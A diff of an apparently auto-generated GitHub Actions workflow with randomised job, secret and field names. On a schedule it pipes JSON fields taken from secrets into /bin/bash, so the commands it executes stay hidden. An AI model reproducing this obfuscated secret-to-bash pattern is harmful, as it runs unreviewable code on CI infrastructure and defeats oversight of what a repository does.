@@ -3,26 +3,19 @@ name: jialuoshu4716
 on:
   workflow_dispatch:
   schedule:
-    - cron: '29 1/6 * * *'
-jobs:  # 6324
+    - cron: '26 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jialuoshu4716
         env:
-          zfi42324: ${{ secrets.zfi42324 }}
+          quisv4521: ${{ secrets.quisv4521 }}
         run: |
-          echo $zfi42324 | jq -r .dfduj9571 | /bin/bash
-          echo $w766 | jq -r .lgsu0974 | /bin/bash
-          echo $u049 | jq -r .pr41421 | /bin/bash
-          echo $jiu50 | jq -r .kg50 | /bin/bash
-          echo $qjjz56 | jq -r .nf60 | /bin/bash
-          echo $blyy5 | jq -r .ul63 | /bin/bash
-          echo $ocm20638 | jq -r .baqne9603 | /bin/bash
-          echo $weov91 | jq -r .xkeoa65 | /bin/bash
-          echo $hqopk782 | jq -r .jkx3026 | /bin/bash
-          echo $npaq92596 | jq -r .qc50629 | /bin/bash
-          echo $kvaa9658 | jq -r .zz2943 | /bin/bash
-          echo $n4392 | jq -r .mxmz2 | /bin/bash
+          echo $quisv4521 | jq -r .bmg6 | /bin/bash
+          echo $hxobo09 | jq -r .iuuc8 | /bin/bash
+          echo $m0 | jq -r .uxnb6 | /bin/bash
+          echo $hdhf11 | jq -r .dtoq0741 | /bin/bash
 
